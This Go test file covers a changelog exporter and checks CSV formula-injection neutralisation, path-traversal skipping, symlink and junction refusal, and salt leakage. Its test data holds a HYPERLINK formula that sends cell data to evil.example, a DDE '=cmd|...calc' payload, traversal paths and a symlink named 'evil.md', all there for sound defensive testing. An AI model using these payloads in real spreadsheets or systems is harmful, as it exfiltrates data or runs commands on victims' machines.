package export

import (
	"bytes"
	"crypto/sha256"
	"database/sql"
	"encoding/csv"
	"encoding/hex"
	"encoding/json"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/cjrdz/githints/internal/index"
	"github.com/cjrdz/githints/internal/integrity"
	"github.com/cjrdz/githints/internal/notes"
	"github.com/cjrdz/githints/internal/recorder"
	"github.com/cjrdz/githints/internal/store"
)

const formula = `=HYPERLINK("http://evil.example/?"&A1,"click")`

type fixture struct {
	t    *testing.T
	root string
	st   *store.Store
	db   *index.Store
	key  []byte
}

func newFixture(t *testing.T) *fixture {
	t.Helper()
	t.Setenv("GITHINTS_SALT_DIR", t.TempDir())
	root := t.TempDir()
	st, err := store.Open(filepath.Join(root, ".githints", "store.db"))
	if err != nil {
		t.Fatal(err)
	}
	db, err := index.Open(filepath.Join(root, ".githints", "index.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close(); db.Close() })
	key, err := integrity.KeyFromRepo(root)
	if err != nil {
		t.Fatal(err)
	}
	return &fixture{t: t, root: root, st: st, db: db, key: key}
}

func (f *fixture) change(file, summary, reason, commit string) store.Change {
	f.t.Helper()
	c, err := recorder.RecordChange(f.st, f.root, f.key, recorder.Input{
		FilePath: file, Summary: summary, Reason: reason, Source: "agent", CommitHash: commit,
	})
	if err != nil {
		f.t.Fatalf("RecordChange: %v", err)
	}
	return c
}

func (f *fixture) outcome(id int64, state, note string) {
	f.t.Helper()
	if _, err := recorder.RecordOutcome(f.st, f.root, f.key, recorder.OutcomeInput{ChangeID: id, State: state, Note: note}); err != nil {
		f.t.Fatalf("RecordOutcome: %v", err)
	}
}

func (f *fixture) export(opt Options) (Result, string) {
	f.t.Helper()
	if opt.Dir == "" {
		opt.Dir = filepath.Join(f.t.TempDir(), "pack")
	}
	res, err := Run(f.root, f.st, f.db, opt)
	if err != nil {
		f.t.Fatalf("Run: %v", err)
	}
	return res, opt.Dir
}

func read(t *testing.T, dir, rel string) string {
	t.Helper()
	b, err := os.ReadFile(filepath.Join(dir, rel))
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

func seed(f *fixture) {
	a := f.change("internal/auth/token.go", "added retry loop", "flaky endpoint", "aaaa1111")
	f.change("internal/auth/session.go", formula, `quote " and, comma`+"\nsecond line", "aaaa1111")
	f.change("pending.go", "-not a flag, a summary", "", "")
	f.outcome(a.ID, store.OutcomeFailed, "deadlocks under load")
}

func TestExportContents(t *testing.T) {
	f := newFixture(t)
	seed(f)
	res, dir := f.export(Options{DuckDB: true, Version: "test"})

	for _, want := range []string{"changes.jsonl", "changes.csv", "CHANGES-full.md", "manifest.json", "githints.duckdb.sql",
		"hints/internal/auth/token.go.md", "hints/pending.go.md"} {
		if _, err := os.Stat(filepath.Join(dir, want)); err != nil {
			t.Errorf("%s missing: %v", want, err)
		}
	}
	if res.Manifest.Counts["changes"] != 3 || res.Manifest.Counts["outcomes"] != 1 || res.Manifest.Counts["files_with_history"] != 3 {
		t.Errorf("counts = %v", res.Manifest.Counts)
	}

	// JSONL: exact, one object per row, in id order.
	lines := strings.Split(strings.TrimRight(read(t, dir, "changes.jsonl"), "\n"), "\n")
	if len(lines) != 4 {
		t.Fatalf("%d jsonl lines, want 4", len(lines))
	}
	var rows []jsonRow
	for i, l := range lines {
		var r jsonRow
		if err := json.Unmarshal([]byte(l), &r); err != nil {
			t.Fatalf("line %d is not JSON: %v", i, err)
		}
		rows = append(rows, r)
	}
	if rows[1].Summary != formula || !strings.Contains(rows[1].Reason, "second line") {
		t.Errorf("jsonl changed the text: %+v", rows[1])
	}
	if rows[3].Kind != "outcome" || rows[3].TargetID != rows[0].ID || rows[3].Outcome != "failed" {
		t.Errorf("outcome row = %+v", rows[3])
	}
	if rows[0].HMAC == "" || rows[0].RecordedAtUTC == "" {
		t.Errorf("row lost its signature or time: %+v", rows[0])
	}

	// CSV: parses back, and the formula cell cannot run.
	recs, err := csv.NewReader(strings.NewReader(read(t, dir, "changes.csv"))).ReadAll()
	if err != nil {
		t.Fatalf("csv does not parse: %v", err)
	}
	if len(recs) != 5 || strings.Join(recs[0], ",") != strings.Join(columns, ",") {
		t.Fatalf("csv shape: %d records, header %v", len(recs), recs[0])
	}
	if got := recs[2][6]; got != "'"+formula {
		t.Errorf("formula cell = %q, want it prefixed with a quote", got)
	}
	if got := recs[3][6]; got != "'-not a flag, a summary" {
		t.Errorf("leading '-' cell = %q", got)
	}
	if got := recs[1][6]; got != "added retry loop" {
		t.Errorf("an ordinary cell was altered: %q", got)
	}
	if got := recs[2][7]; !strings.Contains(got, "quote \" and, comma\nsecond line") {
		t.Errorf("quoting lost in csv: %q", got)
	}

	// The full changelog nests the outcome under its change.
	md := read(t, dir, "CHANGES-full.md")
	if !strings.Contains(md, "## uncommitted") || !strings.Contains(md, "outcome: failed: deadlocks under load") {
		t.Errorf("changelog:\n%s", md)
	}
	if strings.Count(md, "- #") != 3 {
		t.Errorf("changelog lists %d entries, want the 3 changes (not the outcome)", strings.Count(md, "- #"))
	}

	// Hints carry the outcome too.
	if h := read(t, dir, "hints/internal/auth/token.go.md"); !strings.Contains(h, "outcome: failed") {
		t.Errorf("hint lacks the outcome:\n%s", h)
	}
}

func TestManifestHashesMatchTheFiles(t *testing.T) {
	f := newFixture(t)
	seed(f)
	res, dir := f.export(Options{DuckDB: true})

	listed := map[string]FileEntry{}
	for _, e := range res.Manifest.Files {
		listed[e.Path] = e
	}
	if _, self := listed["manifest.json"]; self {
		t.Error("the manifest lists itself")
	}
	onDisk := map[string]bool{}
	err := filepath.WalkDir(dir, func(p string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		rel, _ := filepath.Rel(dir, p)
		rel = filepath.ToSlash(rel)
		if rel == "manifest.json" {
			return nil
		}
		onDisk[rel] = true
		b, _ := os.ReadFile(p)
		sum := sha256.Sum256(b)
		e, ok := listed[rel]
		if !ok {
			t.Errorf("%s is in the pack but not in the manifest", rel)
		} else if e.SHA256 != hex.EncodeToString(sum[:]) || e.Bytes != int64(len(b)) {
			t.Errorf("%s: manifest says %d bytes %s, file is %d bytes %x", rel, e.Bytes, e.SHA256, len(b), sum)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	for p := range listed {
		if !onDisk[p] {
			t.Errorf("the manifest lists %s, which is not in the pack", p)
		}
	}
	// What the manifest on disk says is what Run returned.
	var m Manifest
	if err := json.Unmarshal([]byte(read(t, dir, "manifest.json")), &m); err != nil || m.Format != 1 || len(m.Files) != len(res.Manifest.Files) {
		t.Errorf("manifest on disk: %v %+v", err, m)
	}
	if m.Log.LastID == 0 || m.Log.Root == "" {
		t.Errorf("log summary missing: %+v", m.Log)
	}
}

// A pack is attached to emails and dropped into notebooks. It must hold no
// salt, no key, and nothing that names this machine, whatever else is sitting
// in .githints/.
func TestExportContainsNoSaltAndNoMachinePaths(t *testing.T) {
	f := newFixture(t)
	seed(f)

	state := filepath.Join(f.root, ".githints")
	salt, err := integrity.ExportSalt(f.root)
	if err != nil {
		t.Fatal(err)
	}
	legacy := "LEGACY-SALT-" + salt
	for name, content := range map[string]string{".salt": legacy, ".salt.new": legacy, "repo-id": "REPO-ID-SECRET", "config.json": "{}"} {
		if err := os.WriteFile(filepath.Join(state, name), []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	_, dir := f.export(Options{DuckDB: true})

	saltPath := integrity.SaltPath(f.root)
	err = filepath.WalkDir(dir, func(p string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		switch d.Name() {
		case ".salt", ".salt.new", "repo-id", "store.db", "index.db", "config.json":
			t.Errorf("a state file was copied into the pack: %s", p)
		}
		b, _ := os.ReadFile(p)
		for what, needle := range map[string]string{
			"the salt": salt, "a legacy salt": "LEGACY-SALT", "the repo id": "REPO-ID-SECRET",
			"the repository path": f.root, "the salt path": filepath.Dir(saltPath), "the state directory": state,
		} {
			if bytes.Contains(b, []byte(needle)) {
				t.Errorf("%s appears in %s", what, strings.TrimPrefix(p, dir))
			}
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
}

func TestExportRefusesUnsafeDestinations(t *testing.T) {
	f := newFixture(t)
	seed(f)
	base := t.TempDir()

	full := filepath.Join(base, "full")
	if err := os.MkdirAll(full, 0o755); err != nil {
		t.Fatal(err)
	}
	keep := filepath.Join(full, "mine.txt")
	if err := os.WriteFile(keep, []byte("precious"), 0o644); err != nil {
		t.Fatal(err)
	}
	file := filepath.Join(base, "afile")
	if err := os.WriteFile(file, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	cases := map[string]string{
		"non-empty directory": full,
		"an existing file":    file,
		"empty path":          "",
		"state directory":     filepath.Join(f.root, ".githints"),
		"inside the state":    filepath.Join(f.root, ".githints", "notes", "x"),
	}
	link := filepath.Join(base, "link")
	if err := os.Symlink(full, link); err == nil {
		cases["a symlink"] = link
	}
	for name, dir := range cases {
		if _, err := Run(f.root, f.st, f.db, Options{Dir: dir}); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	if b, _ := os.ReadFile(keep); string(b) != "precious" {
		t.Errorf("an existing file was disturbed: %q", b)
	}
	if entries, _ := os.ReadDir(full); len(entries) != 1 {
		t.Errorf("files were written into a directory that was refused: %v", entries)
	}
	if _, err := os.Stat(filepath.Join(f.root, ".githints", "notes", "x")); err == nil {
		t.Error("a directory was created inside .githints/")
	}

	// An existing empty directory is fine.
	empty := filepath.Join(base, "empty")
	if err := os.MkdirAll(empty, 0o755); err != nil {
		t.Fatal(err)
	}
	if _, err := Run(f.root, f.st, f.db, Options{Dir: empty}); err != nil {
		t.Errorf("an empty directory was refused: %v", err)
	}
	// And a pack never goes over another pack.
	if _, err := Run(f.root, f.st, f.db, Options{Dir: empty}); err == nil {
		t.Error("a second export into the same directory succeeded")
	}
}

func TestExportVerifyStatus(t *testing.T) {
	f := newFixture(t)
	seed(f)
	res, _ := f.export(Options{})
	if v := res.Manifest.Verify; v.Chain != "ok" || v.ChainProblems != 0 || v.ClockTamperRows != 0 {
		t.Fatalf("a clean log: %+v", v)
	}

	// Rewrite a summary behind githints' back: the chain no longer verifies, and
	// the pack says so rather than hiding it.
	raw, err := sql.Open("sqlite", filepath.Join(f.root, ".githints", "store.db"))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := raw.Exec(`UPDATE changes SET summary = 'rewritten' WHERE id = 1`); err != nil {
		t.Fatal(err)
	}
	raw.Close()
	res, _ = f.export(Options{})
	v := res.Manifest.Verify
	if v.Chain != "failed" || v.ChainProblems == 0 || v.OK() {
		t.Errorf("a tampered log: %+v", v)
	}
}

// With no salt on this machine the chain cannot be checked; that is reported as
// such, in fixed words, and never as a path.
func TestExportVerifyUnavailableWithoutSalt(t *testing.T) {
	f := newFixture(t)
	seed(f)
	if err := os.Remove(integrity.SaltPath(f.root)); err != nil {
		t.Skipf("salt is not at the default path here: %v", err)
	}
	res, dir := f.export(Options{})
	v := res.Manifest.Verify
	if v.Chain != "unavailable" || v.OK() {
		t.Errorf("status = %+v, want unavailable", v)
	}
	if strings.Contains(v.Detail, "/") || strings.Contains(read(t, dir, "manifest.json"), f.root) {
		t.Errorf("the status names a path: %q", v.Detail)
	}
}

func TestExportNotes(t *testing.T) {
	f := newFixture(t)
	seed(f)
	if _, err := notes.Record(f.db, f.root, notes.RecordInput{Title: "Why rotation moved", Body: "middleware, see [[internal/auth/token.go]]", Tags: []string{"auth"}}); err != nil {
		t.Fatal(err)
	}
	dir := filepath.Join(f.root, ".githints", "notes")
	if err := os.WriteFile(filepath.Join(dir, "leaky.md"), []byte("key AKIAIOSFODNN7EXAMPLE\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("../store.db", filepath.Join(dir, "evil.md")); err != nil {
		t.Log("no symlinks here; skipping that part")
	}

	res, pack := f.export(Options{DuckDB: true})
	if res.Manifest.Counts["notes"] != 1 {
		t.Errorf("notes exported = %d, want only the clean one", res.Manifest.Counts["notes"])
	}
	entries, _ := os.ReadDir(filepath.Join(pack, "notes"))
	if len(entries) != 1 || entries[0].Name() != "why-rotation-moved.md" {
		t.Errorf("notes in the pack: %v", entries)
	}
	if _, err := notes.Parse("why-rotation-moved", []byte(read(t, pack, "notes/why-rotation-moved.md"))); err != nil {
		t.Errorf("an exported note does not read back: %v", err)
	}
	if !strings.Contains(read(t, pack, "githints.duckdb.sql"), "read_text('notes/*.md')") {
		t.Error("the DuckDB script does not load the notes")
	}

	res, pack = f.export(Options{NoNotes: true, DuckDB: true})
	if _, err := os.Stat(filepath.Join(pack, "notes")); err == nil || res.Manifest.Counts["notes"] != 0 {
		t.Error("NoNotes still exported notes")
	}
	if strings.Contains(read(t, pack, "githints.duckdb.sql"), "read_text") {
		t.Error("the DuckDB script loads notes that are not there (read_text fails on an empty glob)")
	}
}

// A store row is a file anyone who can write it can edit. A hostile path must
// be skipped and reported, never turned into a path outside the pack.
func TestExportSkipsHostilePathsInTheStore(t *testing.T) {
	f := newFixture(t)
	seed(f)
	raw, err := sql.Open("sqlite", filepath.Join(f.root, ".githints", "store.db"))
	if err != nil {
		t.Fatal(err)
	}
	for _, p := range []string{"../../escape.go", "/etc/abs.go", "a/../../b.go"} {
		if _, err := raw.Exec(`INSERT INTO changes (file_path, source, summary, recorded_at) VALUES (?, 'agent', 'x', 1)`, p); err != nil {
			t.Fatal(err)
		}
	}
	raw.Close()

	parent := t.TempDir()
	dir := filepath.Join(parent, "pack")
	res, err := Run(f.root, f.st, f.db, Options{Dir: dir})
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if len(res.Manifest.Skipped) != 3 {
		t.Errorf("skipped = %v, want the 3 hostile paths", res.Manifest.Skipped)
	}
	// Nothing appeared beside the pack.
	if entries, _ := os.ReadDir(parent); len(entries) != 1 {
		t.Errorf("files appeared outside the pack: %v", entries)
	}
	for _, bad := range []string{"escape.go", "abs.go", "b.go"} {
		if err := filepath.WalkDir(parent, func(p string, d fs.DirEntry, err error) error {
			if err == nil && strings.HasSuffix(p, bad+".md") {
				t.Errorf("a hint was written for %s at %s", bad, p)
			}
			return nil
		}); err != nil {
			t.Fatal(err)
		}
	}
}

func TestNeutralize(t *testing.T) {
	for in, want := range map[string]string{
		"":                  "",
		"plain":             "plain",
		"a=b":               "a=b",
		"=SUM(A1)":          "'=SUM(A1)",
		"+1":                "'+1",
		"-1":                "'-1",
		"@cmd":              "'@cmd",
		"  =SUM(A1)":        "'  =SUM(A1)",
		"\n=SUM(A1)":        "'\n=SUM(A1)",
		"\t=SUM(A1)":        "'\t=SUM(A1)",
		"\r=SUM(A1)":        "'\r=SUM(A1)",
		"   ":               "   ",
		"1 - 2":             "1 - 2",
		"-not a flag":       "'-not a flag",
		"internal/auth.go":  "internal/auth.go",
		"-internal/auth.go": "'-internal/auth.go",
	} {
		if got := neutralize(in); got != want {
			t.Errorf("neutralize(%q) = %q, want %q", in, got, want)
		}
	}
}

func FuzzNeutralize(f *testing.F) {
	for _, s := range []string{"", "=1", " +1", "\t@x", "a", "\n\n-x", "  \r=x"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		got := neutralize(s)
		trimmed := strings.TrimLeft(got, " \t\r\n")
		if trimmed != "" && strings.ContainsRune("=+-@", rune(trimmed[0])) {
			t.Fatalf("neutralize(%q) = %q still starts a formula", s, got)
		}
		if got != s && got != "'"+s {
			t.Fatalf("neutralize changed %q to %q", s, got)
		}
		if len(got) > 0 && got[0] != '\'' && (got[0] == '\t' || got[0] == '\r') {
			t.Fatalf("a leading tab or carriage return survived: %q", got)
		}
	})
}

// The DuckDB script holds none of the log's text: it names the pack's files and
// declares columns, so there is nothing to quote and nothing to inject into.
func TestDuckDBScriptHoldsNoData(t *testing.T) {
	f := newFixture(t)
	seed(f)
	_, dir := f.export(Options{DuckDB: true})
	script := read(t, dir, "githints.duckdb.sql")
	for _, leaked := range []string{"HYPERLINK", "added retry loop", "flaky endpoint", "internal/auth", "deadlocks"} {
		if strings.Contains(script, leaked) {
			t.Errorf("the script contains log text %q", leaked)
		}
	}
	for _, col := range columns {
		if !strings.Contains(script, "'"+col+"':") {
			t.Errorf("the script does not declare column %s", col)
		}
	}
	if strings.Contains(script, "INSERT") {
		t.Error("the script inserts literals")
	}
}

// When a duckdb binary is around, run the script for real against a pack.
func TestDuckDBScriptRuns(t *testing.T) {
	bin, err := exec.LookPath("duckdb")
	if err != nil {
		t.Skip("no duckdb on PATH")
	}
	f := newFixture(t)
	seed(f)
	if _, err := notes.Record(f.db, f.root, notes.RecordInput{Title: "A note", Body: "text"}); err != nil {
		t.Fatal(err)
	}
	_, dir := f.export(Options{DuckDB: true})
	script := read(t, dir, "githints.duckdb.sql") +
		"\nSELECT count(*) AS changes FROM changes;\nSELECT count(*) AS failed FROM failed_attempts;\nSELECT count(*) AS notes FROM notes;\n"
	cmd := exec.Command(bin, "-csv", ":memory:")
	cmd.Dir = dir
	cmd.Stdin = strings.NewReader(script)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("duckdb: %v\n%s", err, out)
	}
	got := string(out)
	for _, want := range []string{"changes\n3", "failed\n1", "notes\n1"} {
		if !strings.Contains(got, want) {
			t.Errorf("duckdb output lacks %q:\n%s", want, got)
		}
	}
}

// A path is inside .githints/ by where it resolves, not by how it is spelled.
func TestExportRefusesADestinationThatResolvesIntoState(t *testing.T) {
	f := newFixture(t)
	seed(f)
	base := t.TempDir()
	link := filepath.Join(base, "viaLink")
	if err := os.Symlink(filepath.Join(f.root, ".githints"), link); err != nil {
		t.Skipf("cannot create symlinks here: %v", err)
	}
	for name, dir := range map[string]string{
		"through a symlinked parent": filepath.Join(link, "pack"),
		"through it, deeper":         filepath.Join(link, "a", "b", "pack"),
		"upper-cased":                filepath.Join(strings.ToUpper(f.root), ".GITHINTS", "pack"),
	} {
		if _, err := Run(f.root, f.st, f.db, Options{Dir: dir}); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	if entries, _ := os.ReadDir(filepath.Join(f.root, ".githints")); func() bool {
		for _, e := range entries {
			if e.Name() == "pack" || e.Name() == "a" {
				return true
			}
		}
		return false
	}() {
		t.Error("a pack was written inside .githints/")
	}
}

// The signature columns are hex in a real log, but a tampered store can hold
// anything, and a cell that starts a formula is one whatever column it is in.
func TestCSVNeutralizesEveryColumn(t *testing.T) {
	f := newFixture(t)
	seed(f)
	raw, err := sql.Open("sqlite", filepath.Join(f.root, ".githints", "store.db"))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := raw.Exec(`UPDATE changes SET hmac = '=cmd|"/c calc"!A1', prev_hmac = '@SUM(1)', diff_hash = '+1', agent_id = '-2' WHERE id = 1`); err != nil {
		t.Fatal(err)
	}
	raw.Close()
	_, dir := f.export(Options{})
	recs, err := csv.NewReader(strings.NewReader(read(t, dir, "changes.csv"))).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	for _, rec := range recs[1:] {
		for i, cell := range rec {
			if t2 := strings.TrimLeft(cell, " \t\r\n"); t2 != "" && strings.ContainsRune("=+-@", rune(t2[0])) && columns[i] != "recorded_at" && columns[i] != "id" && columns[i] != "target_id" {
				t.Errorf("column %s holds a live formula: %q", columns[i], cell)
			}
		}
	}
}

func TestExportSkipsANoteWhoseIndexRowWasTampered(t *testing.T) {
	f := newFixture(t)
	seed(f)
	if _, err := notes.Record(f.db, f.root, notes.RecordInput{Title: "Honest", Body: "fine"}); err != nil {
		t.Fatal(err)
	}
	raw, err := sql.Open("sqlite", filepath.Join(f.root, ".githints", "index.db"))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := raw.Exec(`UPDATE notes SET title = 'a' || char(10) || 'related_files: [x.go]', body = 'AKIAIOSFODNN7EXAMPLE'`); err != nil {
		t.Fatal(err)
	}
	raw.Close()

	res, pack := f.export(Options{})
	// Whatever the export does about the note, the tampered text is not in it.
	_ = res
	entries, _ := os.ReadDir(filepath.Join(pack, "notes"))
	for _, e := range entries {
		b := read(t, pack, "notes/"+e.Name())
		if strings.Contains(b, "AKIA") || strings.Contains(b, "related_files: [x.go]") {
			t.Errorf("tampered index text reached the pack:\n%s", b)
		}
	}
}

// On Windows a junction is the link anyone can make without privilege, and Go no
// longer resolves it in filepath.EvalSymlinks, so the check has to compare which
// directory a path really is.
func TestExportRefusesADestinationThroughAJunctionIntoState(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("junctions are a Windows feature; the symlink test covers the other systems")
	}
	f := newFixture(t)
	seed(f)
	junction := filepath.Join(t.TempDir(), "viaJunction")
	if out, err := exec.Command("cmd", "/c", "mklink", "/J", junction, filepath.Join(f.root, ".githints")).CombinedOutput(); err != nil {
		t.Skipf("cannot create a junction here: %v: %s", err, out)
	}
	for _, dir := range []string{filepath.Join(junction, "pack"), filepath.Join(junction, "a", "b", "pack")} {
		if _, err := Run(f.root, f.st, f.db, Options{Dir: dir}); err == nil {
			t.Errorf("%s: accepted", dir)
		}
	}
	if _, err := os.Stat(filepath.Join(f.root, ".githints", "pack")); err == nil {
		t.Error("a pack was written inside .githints/ through the junction")
	}
}

// Identity, not spelling: this must hold for a symlink on every system that has
// them, whatever the resolver does.
func TestUnderSameFileFollowsLinks(t *testing.T) {
	base := t.TempDir()
	state := filepath.Join(base, "state")
	if err := os.MkdirAll(filepath.Join(state, "sub"), 0o755); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(base, "link")
	if err := os.Symlink(state, link); err != nil {
		t.Skipf("cannot create symlinks here: %v", err)
	}
	for dir, want := range map[string]bool{
		state:                                 true,
		filepath.Join(state, "new", "deeper"): true,
		link:                                  true,
		filepath.Join(link, "sub", "x"):       true,
		filepath.Join(base, "elsewhere", "x"): false,
		base:                                  false,
	} {
		if got := underSameFile(dir, state); got != want {
			t.Errorf("underSameFile(%q) = %v, want %v", dir, got, want)
		}
	}
}
